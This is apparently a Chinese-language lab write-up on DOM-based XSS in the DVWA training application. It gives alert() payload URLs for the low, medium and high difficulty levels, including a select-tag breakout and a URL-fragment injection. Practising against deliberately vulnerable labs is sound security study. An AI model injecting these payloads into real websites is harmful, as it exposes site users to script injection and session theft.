# DVWA XSS DOM 

DOM 全稱為 Document Object Model，用以描述HTML文件的表示法，可以使用Javascript 動態產生完整的網頁，不必透過伺服器。因此 DOM-Based XSS 就是指網頁上的 JavaScript 在執行過程中，沒有詳細檢查資料使得操作 DOM 的過程代入了惡意指令。


## Low

完全沒保護下的URL : 

```
    http://www.dvwa.com/vulnerabilities/xss_d/?default=English
```
改成

```
    http://www.dvwa.com/vulnerabilities/xss_d/?default=111111
```

發現 option 中的選項被改成了 111111
直接調整改變dom 元素
```
    http://www.dvwa.com/vulnerabilities/xss_d/?default=<script>alert('xss')</script>
```

## Medium 


```
    http://172.17.0.1/dvwa/vulnerabilities/xss_d/?default=</select><img src/onerror=alert(1)>
```



https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


## HIGH
* 作為一個html網頁錨的定位功能，#號後面的資料是不會進到後台的。


使用錨定功能破解

```
    http://172.17.0.1/dvwa/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```